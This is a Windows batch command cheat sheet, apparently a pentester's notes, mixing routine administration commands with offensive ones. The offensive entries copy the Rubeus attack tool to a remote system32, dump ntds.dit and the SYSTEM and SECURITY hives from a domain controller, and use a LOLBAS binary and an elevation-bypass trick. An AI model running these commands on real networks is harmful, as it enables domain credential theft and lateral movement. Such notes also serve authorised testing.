# Copy files between systems
## File
```batchfile
xcopy "C:\Rubeus.exe" "\\[computer.domain.local]\C$\Windows\system32\"
```
## Directory
### xcopy
```batchfile
xcopy "C:\temp\" "\\[computer.domain.local]\" /E /H /C /I
```
### robocopy
```batchfile
robocopy "C:\temp\" "\\[computer.domain.local]\temp\ /MIR"
```

# Recursively delete a folder and everything inside it
## rd
```batchfile
rd /S /Q "C:\Users\[user]\Downloads\[folder]"
```

## robocopy
```batchfile
robocopy "C:\empty_folder\" "\\[computer.domain.local]\folder_to_delete\ /MIR"
```

# Dump ntds.dit on a domain controller
```batchfile
ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\xn--5o8hui" q q
xcopy "\\<dc>.<domain.local>\C$\Windows\Temp\xn--5o8hui\Active Directory\ntds.dit" C:\<dc>\
xcopy "\\<dc>.<domain.local>\C$\Windows\Temp\xn--5o8hui\registry\SYSTEM" C:\<dc>\
xcopy "\\<dc>.<domain.local>\C$\Windows\Temp\xn--5o8hui\registry\SECURITY" C:\<dc>\
rmdir /S C:\Windows\Temp\xn--5o8hui\
```

# Run commands via [conhost](https://lolbas-project.github.io/lolbas/Binaries/Conhost/)
```batchfile
conhost cmd.exe
```

# Find files or directories

# Find all files and directories
```batchfile
dir "C:\Users\*.txt" /s
```
## Print only file names (no heading information or summary)
```batchfile
dir /s /b /o:gn "C:\Users\*.txt"
```

# Merge two binary files
```batchfile
copy /b cmd.exe+calc.exe new_cmd.exe
```

# Get hash of a file
```batchfile
certutil -hashfile C:\Windows\System32\cmd.exe SHA256
```

# [Displays the device join status](https://learn.microsoft.com/en-us/azure/active-directory/devices/faq#how-do-i-know-what-the-device-registration-state-of-the-client-is)
```batchfile
dsregcmd.exe /status
```
# Get a list of logged user sessions from a remote computer
## query session
```batchfile
query session /server:[server]
```
### qwinsta
```batchfile
qwinsta /server:[server]
```
## query user
```batchfile
query user /server:[server]
```

# Install Windows applications as current user
```batchfile
set __COMPAT_LAYER=RunAsInvoker
start installer.exe
```

# Find a listening port
```batchfile
netstat -aofn | findstr :10080
```

# Run a command from remote share
```batchfile
start cmd /k "\\[computer.domain.local]\echo-server.exe"
```
